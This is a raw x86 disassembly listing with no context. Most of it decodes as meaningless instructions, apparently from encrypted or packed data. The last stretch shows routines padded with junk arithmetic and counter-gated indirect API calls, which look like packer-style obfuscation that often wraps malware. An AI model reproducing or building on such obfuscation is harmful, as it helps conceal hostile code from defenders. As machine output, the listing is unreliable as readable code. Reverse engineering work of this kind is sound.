  405798:	add    eax,0x5b57c258
  40579d:	or     DWORD PTR [ebx+0x22],ebx
  4057a0:	ins    DWORD PTR es:[edi],dx
  4057a1:	int    0x26
  4057a3:	das    
  4057a4:	jmp    0xec:0xd53cd9cd
  4057ab:	es pop ss
  4057ad:	(bad)  
  4057ae:	ja     0x405733
  4057b0:	daa    
  4057b1:	inc    eax
  4057b2:	add    ebp,eax
  4057b4:	push   cs
  4057b5:	cmp    BYTE PTR ds:[ebx+0x3705b9ad],bl
  4057bc:	retf   
  4057bd:	(bad)
  4057c0:	sbb    DWORD PTR [ebp-0x6bddc1e6],ebx
  4057c6:	in     al,dx
  4057c7:	mov    ah,0x32
  4057c9:	sahf   
  4057ca:	shr    BYTE PTR [edi+0x6c95da15],0xe9
  4057d1:	push   0x617900eb
  4057d6:	fdiv   QWORD PTR [eax-0x71]
  4057d9:	pop    edx
  4057da:	fisttp DWORD PTR [eax-0x2c]
  4057dd:	stc    
  4057de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057df:	cmc    
  4057e0:	push   0x9dd6458d
  4057e5:	dec    esi
  4057e6:	jbe    0x4057a9
  4057e8:	mov    eax,DWORD PTR [esi+ecx*1]
  4057eb:	fcomp  QWORD PTR [edi+0x43]
  4057ee:	pushf  
  4057ef:	das    
  4057f0:	inc    ebp
  4057f1:	jne    0x40580f
  4057f3:	dec    esi
  4057f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057f5:	and    dl,cl
  4057f7:	add    dh,BYTE PTR [ebp+0x4a]
  4057fa:	into   
  4057fb:	jne    0x4057cf
  4057fd:	mov    ebx,0xe311cb1f
  405802:	rcr    BYTE PTR [ebp-0x6f],0xe4
  405806:	mov    ch,0xb9
  405808:	aaa    
  405809:	cmp    esi,DWORD PTR cs:[esi]
  40580c:	mov    edi,esp
  40580e:	and    BYTE PTR [ebp+0x3],0xdf
  405812:	scas   eax,DWORD PTR es:[edi]
  405813:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  405815:	push   ecx
  405816:	adc    DWORD PTR [edx-0x627f3a80],ebx
  40581c:	mov    ah,0xd9
  40581e:	xchg   BYTE PTR ds:0x9693d5aa,cl
  405824:	call   0x4cfc:0x4166208
  40582b:	rcr    BYTE PTR [ecx-0x1],cl
  40582e:	push   esp
  40582f:	jge    0x405873
  405831:	xchg   edx,eax
  405832:	adc    esp,eax
  405834:	aaa    
  405835:	xor    al,0xa9
  405837:	loop   0x405840
  405839:	sar    BYTE PTR [ecx],0x86
  40583c:	bound  esp,QWORD PTR [edx+0x6c2dd7d0]
  405842:	adc    al,0x85
  405844:	jmp    FWORD PTR [edi-0x7a]
  405847:	cmp    ebp,DWORD PTR ss:[esi-0xa]
  40584b:	cmc    
  40584c:	jl     0x405854
  40584e:	lahf   
  40584f:	inc    esp
  405850:	or     al,0xaa
  405852:	int3   
  405853:	push   ecx
  405854:	sbb    BYTE PTR [edx-0x14],ch
  405857:	xchg   ch,bl
  405859:	stos   BYTE PTR es:[edi],al
  40585a:	retf   0x8f9a
  40585d:	xor    DWORD PTR [edi-0x8],eax
  405860:	pop    eax
  405861:	sbb    DWORD PTR [esi-0x5315db11],edi
  405867:	pushf  
  405868:	sub    al,BYTE PTR [esi+edx*2]
  40586b:	dec    edi
  40586c:	addr16 cwde 
  40586e:	push   eax
  40586f:	sub    al,0x19
  405871:	jno    0x40585a
  405873:	mov    ebx,0x7fb6f984
  405878:	mov    edx,0xbd361c99
  40587d:	ret    0x18a6
  405880:	jle    0x4058ce
  405882:	inc    ebx
  405883:	das    
  405884:	mov    ah,0x8d
  405886:	cmp    al,0x32
  405888:	popf   
  405889:	aad    0x6e
  40588b:	in     eax,0xb7
  40588d:	repnz (bad) 
  40588f:	ins    DWORD PTR es:[edi],dx
  405890:	icebp  
  405891:	loopne 0x405901
  405893:	adc    DWORD PTR [ebx+0x44],0xe92d0978
  40589a:	stos   DWORD PTR es:[edi],eax
  40589b:	jmp    0xeeeb:0x48fd08d5
  4058a2:	push   es
  4058a3:	ins    DWORD PTR es:[edi],dx
  4058a4:	pop    es
  4058a5:	in     al,dx
  4058a6:	jmp    0x405870
  4058a8:	xlat   BYTE PTR ds:[ebx]
  4058a9:	cld    
  4058aa:	pop    esi
  4058ab:	or     al,0xdb
  4058ad:	call   0x1887a629
  4058b2:	adc    al,0xcc
  4058b4:	add    al,0xb0
  4058b6:	pop    esp
  4058b7:	ja     0x40583c
  4058b9:	jmp    0x4058ba
  4058bb:	mov    eax,ds:0x70ece6b6
  4058c0:	pop    ds
  4058c1:	push   0xffffff9e
  4058c3:	loope  0x405883
  4058c5:	pop    esi
  4058c6:	sbb    DWORD PTR [ecx+0x64561dc5],0x44a47b73
  4058d0:	sar    ch,cl
  4058d2:	jne    0x405926
  4058d4:	mov    bl,0xf5
  4058d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058d7:	mov    ebp,esp
  4058d9:	inc    edx
  4058da:	mov    dl,0x43
  4058dc:	js     0x4058ec
  4058de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058df:	mov    edi,0xcbf7fa64
  4058e4:	test   BYTE PTR [eax+0x28],cl
  4058e7:	xchg   edi,eax
  4058e8:	call   0x7422d80a
  4058ed:	imul   ecx,DWORD PTR gs:[ecx],0x28
  4058f1:	mov    dl,0xea
  4058f3:	push   ds
  4058f4:	or     dl,al
  4058f6:	mov    edi,0xbbea8bc3
  4058fb:	call   0xfd8d:0xcc53ac47
  405902:	ficomp DWORD PTR cs:[edx+0x552e2786]
  405909:	retf   
  40590a:	mov    WORD PTR [ebx],ss
  40590c:	fbstp  TBYTE PTR [esi+0x2a48a3e9]
  405912:	xor    al,0xab
  405914:	add    ebx,DWORD PTR [esi+0xf]
  405917:	cmp    al,0xec
  405919:	add    DWORD PTR [ecx],ebp
  40591b:	(bad)  
  40591c:	cmp    bl,BYTE PTR [edi+edi*8]
  40591f:	stos   DWORD PTR es:[edi],eax
  405920:	sbb    BYTE PTR [eax+0x25],0xa8
  405924:	cmp    al,0x61
  405926:	stc    
  405927:	pop    esp
  405928:	fistp  QWORD PTR [edx+0x1]
  40592b:	fcomp  st(7)
  40592d:	sbb    al,0x9
  40592f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405930:	sti    
  405931:	shl    BYTE PTR [esi+0x3a],1
  405934:	dec    esp
  405935:	pop    es
  405936:	in     eax,0x9b
  405938:	repnz xchg esp,eax
  40593a:	jle    0x4059a4
  40593c:	arpl   WORD PTR [ecx],bp
  40593e:	push   cs
  40593f:	scas   al,BYTE PTR es:[edi]
  405940:	loope  0x4058e1
  405942:	push   ecx
  405943:	mov    ebx,0xb7e81a2b
  405948:	outs   dx,BYTE PTR ds:[esi]
  405949:	push   ds
  40594a:	sar    DWORD PTR [ecx+0x5e],0x89
  40594e:	test   BYTE PTR [edx-0x30a24211],cl
  405954:	xchg   ebp,eax
  405955:	jmp    0x7bd1af62
  40595a:	in     al,0xca
  40595c:	dec    edx
  40595d:	mov    dh,0xb3
  40595f:	mov    ah,0x80
  405961:	pop    esp
  405962:	lds    ebp,FWORD PTR [edi+edx*1-0x58db4873]
  405969:	mov    cl,0x4e
  40596b:	push   ds
  40596c:	icebp  
  40596d:	xor    ebx,DWORD PTR [edi+0x5b]
  405970:	or     cl,BYTE PTR [eax]
  405972:	push   es
  405973:	or     al,0xce
  405975:	jno    0x4059be
  405977:	arpl   WORD PTR [edx+eiz*4-0x5c59dcde],ax
  40597e:	mov    ah,0x7e
  405980:	pop    es
  405981:	push   es
  405982:	outs   dx,BYTE PTR ds:[esi]
  405983:	push   ebp
  405984:	mov    eax,ds:0x2cca1670
  405989:	mov    ah,0x54
  40598b:	mov    BYTE PTR [esi],ch
  40598d:	fistp  DWORD PTR [eax+0x5]
  405990:	mov    ds:0xf16cfada,al
  405995:	adc    DWORD PTR [ebx+0x27],edi
  405998:	sub    al,0xe5
  40599a:	icebp  
  40599b:	adc    BYTE PTR [ecx+0x74daeea0],0x1c
  4059a2:	or     al,0x99
  4059a4:	jmp    0x23a9a70f
  4059a9:	xor    dh,BYTE PTR [ebx]
  4059ab:	repnz es gs push cs
  4059af:	shl    edx,1
  4059b1:	adc    edi,DWORD PTR [esi+0x41e5c473]
  4059b7:	aas    
  4059b8:	in     al,0x86
  4059ba:	leave  
  4059bb:	pop    eax
  4059bc:	in     al,0x5b
  4059be:	pop    esp
  4059bf:	retf   
  4059c0:	and    dl,BYTE PTR [eax]
  4059c2:	int    0xe0
  4059c4:	or     DWORD PTR [ebx],ecx
  4059c6:	ret    0xa321
  4059c9:	push   es
  4059ca:	jg     0x405a16
  4059cc:	mov    bh,dl
  4059ce:	sbb    eax,0x74316169
  4059d3:	sub    esi,ebp
  4059d5:	ret    0xd2c
  4059d8:	in     al,0xb6
  4059da:	mov    ebx,DWORD PTR gs:[ebp+0x773534ab]
  4059e1:	xchg   esi,eax
  4059e2:	div    BYTE PTR [ebp+0x51319a7c]
  4059e8:	aad    0x5e
  4059ea:	cmp    cl,BYTE PTR gs:[ecx-0x57babf9e]
  4059f1:	dec    esi
  4059f2:	loope  0x40599e
  4059f4:	xchg   ebx,eax
  4059f5:	sub    DWORD PTR [edx+0x235fec28],ebp
  4059fb:	(bad)  
  4059fc:	mov    DWORD PTR [esi+0x7b],eax
  4059ff:	shl    DWORD PTR [ebx-0x670e5d97],0xa8
  405a06:	mov    WORD PTR [eax],fs
  405a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a09:	int    0x2f
  405a0b:	dec    ebx
  405a0c:	push   0xd26dfbec
  405a11:	sub    edi,DWORD PTR [ebx]
  405a13:	pop    ebp
  405a14:	hlt    
  405a15:	adc    eax,0x1b86d3f2
  405a1a:	stos   DWORD PTR es:[edi],eax
  405a1b:	outs   dx,DWORD PTR ds:[esi]
  405a1c:	(bad)  
  405a1d:	dec    esi
  405a1e:	or     BYTE PTR [eax],ah
  405a20:	xor    esp,DWORD PTR [ecx+0x12]
  405a23:	mov    dh,0x3c
  405a25:	sbb    eax,DWORD PTR [edx+0x18]
  405a28:	sbb    DWORD PTR [ebx+0x4b],ebp
  405a2b:	cmp    ebx,edx
  405a2d:	mov    eax,esp
  405a2f:	ds xchg esp,eax
  405a31:	push   ss
  405a32:	mov    esp,0x2d50e32
  405a37:	sub    esp,DWORD PTR [eax+0x69]
  405a3a:	cmp    edi,DWORD PTR [ecx-0x57f78f0a]
  405a40:	outs   dx,BYTE PTR ds:[esi]
  405a41:	mov    bh,0x5f
  405a43:	fld    TBYTE PTR [ebx]
  405a45:	mov    bh,0xa1
  405a47:	mov    esi,0xbe821c9
  405a4c:	jl     0x4059e6
  405a4e:	sub    ecx,edx
  405a50:	sbb    cl,BYTE PTR [edi-0x5c]
  405a53:	cdq    
  405a54:	push   es
  405a55:	sbb    al,0xa2
  405a57:	repnz inc ebp
  405a59:	out    0xbc,al
  405a5b:	dec    ecx
  405a5c:	fldenv [eax+eax*4-0x39c6a370]
  405a63:	mov    esp,0x48822791
  405a68:	shr    BYTE PTR [edi],0xc4
  405a6b:	dec    ecx
  405a6c:	dec    edi
  405a6d:	and    BYTE PTR [edx-0x200f8acb],0x3c
  405a74:	sahf   
  405a75:	jg     0x405af2
  405a77:	dec    sp
  405a79:	push   ss
  405a7a:	in     al,dx
  405a7b:	icebp  
  405a7c:	not    DWORD PTR [edx+0x51]
  405a7f:	xchg   edi,eax
  405a80:	xchg   ebx,eax
  405a81:	das    
  405a82:	rcl    BYTE PTR [edi-0x56837c9c],1
  405a88:	pop    edx
  405a89:	retf   0x5d8f
  405a8c:	xchg   edi,eax
  405a8d:	cmp    DWORD PTR [ebx-0x2a],eax
  405a90:	aaa    
  405a91:	mov    eax,0x1701a635
  405a96:	mov    ds,ebx
  405a98:	cld    
  405a99:	sbb    edx,edi
  405a9b:	inc    ebx
  405a9c:	fabs   
  405a9e:	in     eax,dx
  405a9f:	mov    ds:0xed7cf3ac,eax
  405aa4:	xor    al,0xbb
  405aa6:	popa   
  405aa7:	clc    
  405aa8:	imul   esp,DWORD PTR [ecx+ecx*1-0x65d4b46f],0xb3162588
  405ab3:	(bad)  
  405ab4:	jp     0x405ab5
  405ab6:	sbb    ebp,ebx
  405ab8:	dec    esi
  405ab9:	lahf   
  405aba:	xchg   esi,eax
  405abb:	or     eax,0x1ecf1976
  405ac0:	addr16 mov ah,0x3b
  405ac3:	repz jmp 0x405a5b
  405ac6:	cli    
  405ac7:	call   0xd4011d87
  405acc:	pop    esp
  405acd:	jmp    0x405b2c
  405acf:	cmp    al,0x17
  405ad1:	stos   DWORD PTR es:[edi],eax
  405ad2:	mov    esp,0xff014c19
  405ad7:	js     0x405acd
  405ad9:	mov    esp,0xba6dc9a4
  405ade:	pushf  
  405adf:	adc    BYTE PTR [edi-0x52],0x98
  405ae3:	inc    esp
  405ae4:	(bad)  
  405ae5:	addr16 push eax
  405ae7:	add    al,0xc7
  405ae9:	cli    
  405aea:	aaa    
  405aeb:	mov    al,BYTE PTR [ecx-0x9]
  405aee:	fisubr WORD PTR [eax+edi*2+0x55]
  405af2:	test   al,0x2d
  405af4:	mov    al,0xc3
  405af6:	mov    cl,0xf8
  405af8:	mov    bl,0xf7
  405afa:	push   edi
  405afb:	iret   
  405afc:	jle    0x405b1c
  405afe:	jg     0x405aa1
  405b00:	inc    ebp
  405b01:	sbb    cl,BYTE PTR [edi+0x5a]
  405b04:	push   ds
  405b05:	inc    eax
  405b06:	adc    ebp,DWORD PTR [ecx+0x3d]
  405b09:	jmp    0x405aad
  405b0b:	push   esp
  405b0c:	xchg   ebp,eax
  405b0d:	outs   dx,BYTE PTR ds:[esi]
  405b0e:	adc    ch,ah
  405b10:	xchg   BYTE PTR [edx+0x2b],bh
  405b13:	into   
  405b14:	cdq    
  405b15:	jle    0x405b01
  405b17:	not    DWORD PTR [esi-0x1d]
  405b1a:	and    bl,BYTE PTR [ebx-0x24]
  405b1d:	test   DWORD PTR [edi],ebp
  405b1f:	leave  
  405b20:	pop    eax
  405b21:	popa   
  405b22:	push   es
  405b23:	imul   ebx,DWORD PTR [esi],0xfffffff1
  405b26:	imul   esp,eax,0x7bbe6c24
  405b2c:	xchg   BYTE PTR [edx],al
  405b2e:	sbb    ecx,ecx
  405b30:	jae    0x405b28
  405b32:	stos   DWORD PTR es:[edi],eax
  405b33:	sar    BYTE PTR [eax+0xc],1
  405b36:	clc    
  405b37:	mov    cl,0x8e
  405b39:	ret    
  405b3a:	sub    al,0xc3
  405b3c:	or     DWORD PTR [ebx+edx*8-0x5316e397],ebp
  405b43:	(bad)
  405b46:	inc    esp
  405b47:	inc    eax
  405b48:	and    edx,ecx
  405b4a:	jle    0x405ad8
  405b4c:	outs   dx,DWORD PTR ds:[esi]
  405b4d:	pop    edx
  405b4e:	add    edi,DWORD PTR [ecx+0x38]
  405b51:	mov    ecx,0xcb8c5838
  405b56:	pop    edx
  405b57:	jge    0x405b9f
  405b59:	push   esp
  405b5a:	les    ecx,FWORD PTR [esi-0x237bed64]
  405b60:	js     0x405b12
  405b62:	sbb    eax,0x7383ea4f
  405b67:	mov    ecx,0xa6722e21
  405b6c:	mov    eax,ds:0xc75957c9
  405b71:	sbb    edx,ebp
  405b73:	cmc    
  405b74:	or     DWORD PTR [ecx-0x1bdd0ef4],ecx
  405b7a:	fist   DWORD PTR [ebx+0x3d0dbe98]
  405b80:	add    ebp,ecx
  405b82:	push   edi
  405b83:	mov    ebp,0xddcb6fac
  405b88:	mov    ds:0xb7ac1f5a,al
  405b8d:	(bad)  
  405b8e:	mov    edi,0x63165169
  405b93:	popa   
  405b94:	mov    bh,0x59
  405b96:	mov    ch,0x5e
  405b98:	xchg   edi,eax
  405b99:	cmp    BYTE PTR [edx+0x54cb7d2b],dl
  405b9f:	std    
  405ba0:	jge    0x405bd1
  405ba2:	jbe    0x405b55
  405ba4:	adc    DWORD PTR [ebp-0x79],0xa8f25d46
  405bab:	push   0xadd13f96
  405bb0:	jmp    0xb8876bf2
  405bb5:	jne    0x405bba
  405bb7:	or     al,dl
  405bb9:	rcr    DWORD PTR [edx-0x5db37882],cl
  405bbf:	out    dx,al
  405bc0:	aas    
  405bc1:	loop   0x405c03
  405bc3:	or     ch,BYTE PTR [eax+0x2d]
  405bc6:	mov    ebp,0xd397c3de
  405bcb:	pop    es
  405bcc:	pop    esi
  405bcd:	mov    cl,0x6c
  405bcf:	int3   
  405bd0:	mov    ds:0xa7b3a9c8,al
  405bd5:	lods   ax,WORD PTR ss:[esi]
  405bd8:	std    
  405bd9:	inc    edx
  405bda:	push   esp
  405bdb:	mov    eax,ds:0x75a5586e
  405be0:	jecxz  0x405bcc
  405be2:	or     eax,0x5bd079fc
  405be7:	sub    eax,0xe1d50b53
  405bec:	mov    ebx,0x49cbe121
  405bf1:	xor    bh,al
  405bf3:	push   0x21
  405bf5:	pop    ss
  405bf6:	ret    0xc893
  405bf9:	adc    DWORD PTR [ebx],edi
  405bfb:	and    al,0x1
  405bfd:	pop    ebp
  405bfe:	scas   al,BYTE PTR es:[edi]
  405bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c01:	fld    QWORD PTR [ecx+0x65]
  405c04:	js     0x405c0a
  405c06:	jge    0x405c46
  405c08:	call   0xf3b7f66a
  405c0d:	xor    al,0xee
  405c0f:	fistp  WORD PTR [esi+esi*2+0x46]
  405c13:	push   cs
  405c14:	inc    eax
  405c15:	xchg   ebp,eax
  405c16:	jbe    0x405c6d
  405c18:	mov    ebp,0x7f86ff02
  405c1d:	pop    es
  405c1e:	(bad)  
  405c1f:	xor    eax,0x68ca1c0d
  405c24:	adc    eax,0x8e9f89ec
  405c29:	ret    0x8b30
  405c2c:	fdecstp 
  405c2e:	fisttp WORD PTR [edx+ebp*8]
  405c31:	mov    ch,0x67
  405c33:	pop    ecx
  405c34:	ja     0x405be6
  405c36:	jne    0x405bd5
  405c38:	cmc    
  405c39:	into   
  405c3a:	ins    BYTE PTR es:[edi],dx
  405c3b:	and    DWORD PTR [esi+0x53],esp
  405c3e:	test   al,0xdc
  405c40:	out    0x97,al
  405c42:	push   eax
  405c43:	retf   
  405c44:	inc    esi
  405c45:	call   0xbcba5618
  405c4a:	mov    eax,ds:0x421ad2
  405c4f:	push   DWORD PTR [eax]
  405c51:	push   DWORD PTR ds:0x421d2e
  405c57:	push   DWORD PTR ds:0x421ada
  405c5d:	push   DWORD PTR ds:0x421d0e
  405c63:	push   DWORD PTR ds:0x421da2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421cd2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423837
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x4237f6
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a62
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
